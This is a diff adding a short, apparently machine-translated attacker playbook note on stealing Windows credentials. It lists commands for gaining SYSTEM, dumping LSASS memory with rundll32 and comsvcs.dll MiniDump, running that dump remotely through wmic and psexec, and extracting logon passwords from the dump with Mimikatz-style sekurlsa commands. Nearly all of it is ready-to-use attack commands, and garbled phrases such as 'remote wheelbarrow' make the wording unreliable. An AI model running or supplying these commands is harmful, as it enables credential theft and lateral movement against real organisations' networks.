@@ -1,0 +1,15 @@
+LSASS: 
+Method via COBA: (*** special thanks @Sven)
+
+!*  1)getsystem 
+2) shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full  (pid indicate from lsas)
+(shoot on a remote wheelbarrow) coba_wmic:
+shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full"
+remote-exec psexec [target] cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full
+=======
+How to pamper:
+open the facial expressions and further:
+privilege::debug
+sekurlsa::minidump A:\3.WORK\BL-ws20\lsass.DMP (the path is replaced before our file)
+log
+sekurlsa::logonpasswords
